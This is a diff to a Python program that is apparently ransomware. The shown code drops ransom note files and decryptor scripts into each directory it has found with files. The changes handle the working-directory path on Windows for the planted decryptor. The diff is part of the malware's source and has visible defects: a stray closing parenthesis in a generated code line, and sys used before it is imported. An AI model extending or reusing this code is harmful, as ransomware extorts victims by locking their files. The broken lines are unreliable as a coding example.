@@ -147,7 +147,12 @@ class Program():
         with open("decrypt.py", "r") as decryptor_file:
             script_content = decryptor_file.read()
 
-        #cwd = os.getcwd()
+
+        if self.__system__ == "Windows":
+            import sys
+            cwd = os.getcwd()
+            sys.path.append(cwd)
+
         for dir in self.__directories_with_files:
             self.__create_ransomnote_file(dir, content)
             self.__create_decryptor_file(dir, script_content)
@@ -173,7 +178,7 @@ class Program():
 
             #os.chdir(r\"{cwd.replace("\\", "/")}\")
         
-            content = script_content.replace("#added_line_script", f"os.chdir(r'{cwd}')")
+            content = script_content.replace("#added_line_script", f"cwd = r'{cwd}')")
     
             with open(path, "w") as decryptor_file:
                 decryptor_file.write(content)
@@ -202,6 +207,11 @@ class Program():
         if os.path.exists("discovered_info.json"):
             os.remove("discovered_info.json")
 
+        cwd = os.getcwd()
+        if self.__system__ == "Windows" and cwd in sys.path:
+            import sys
+            sys.path.remove(cwd)
+            
     def __test_function(self, path):
         cwd = os.getcwd()
 
